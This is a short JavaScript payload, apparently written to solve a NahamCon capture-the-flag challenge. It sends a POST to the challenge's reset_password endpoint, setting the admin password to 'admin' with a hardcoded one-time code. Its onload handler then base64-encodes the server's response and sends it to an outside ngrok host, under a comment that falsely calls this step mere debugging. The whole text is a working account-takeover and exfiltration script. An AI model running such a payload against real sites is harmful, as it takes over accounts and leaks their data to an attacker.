// Reset admin password
var http = new XMLHttpRequest();
var url = 'http://challenge.nahamcon.com:30666/reset_password';
var data = JSON.stringify({
    'password':'admin',
    'password2':'admin',
    'otp':'661035',
});
http.open('POST', url, true);

// Not actually needed, just for debugging
http.onload = function () {
    var flag = btoa(http.responseText);
    var exfil = new XMLHttpRequest();
    exfil.open("GET","http://b6a5-81-103-153-174.ngrok.io?flag=" + flag);
    exfil.send();
};

http.setRequestHeader('Content-type', 'application/json');

http.send(data);